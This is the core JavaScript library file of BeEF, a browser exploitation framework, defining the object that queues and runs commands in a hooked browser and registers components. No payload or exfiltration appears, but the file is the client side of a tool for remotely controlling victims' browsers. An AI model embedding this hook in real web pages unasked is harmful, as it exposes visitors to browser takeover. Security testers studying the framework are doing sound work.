//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * BeEF JS Library <%= @beef_version %>
 * http://beef.googlecode.com/
 */

$j = jQuery.noConflict();

//<%= @beef_hook_session_name %>='<%= @beef_hook_session_id %>';

if(typeof beef === 'undefined' && typeof window.beef === 'undefined') {
	
	var BeefJS = {
		
		version: '<%= @beef_version %>',
		
		// This get set to true during window.onload(). It's a useful hack when messing with document.write().
		pageIsLoaded: false,
		
		// An array containing functions to be executed by the window.onpopstate() method.
		onpopstate: new Array(),
		
		// An array containing functions to be executed by the window.onclose() method.
		onclose: new Array(),
		
		// An array containing functions to be executed by Beef.
		commands: new Array(),
		
		// An array containing all the BeEF JS components.
		components: new Array(),
		
		/**
		 * Adds a function to execute.
		 * @param: {Function} the function to execute.
		 */
		execute: function(fn) {
            if ( typeof  beef.websocket == "undefined"){
                console.log("--- NO WEBSOCKETS ---");
                this.commands.push(fn);
            }else{
                console.log("--- WEBSOCKETS ENABLED ---");
                fn();
            }
        },



		/**
		 * Registers a component in BeEF JS.
		 * @params: {String} the component.
		 *
		 * Components are very important to register so the framework does not
		 * send them back over and over again.
		 */
		regCmp: function(component) {
			this.components.push(component);
		}
	
    };
	
	window.beef = BeefJS;
}
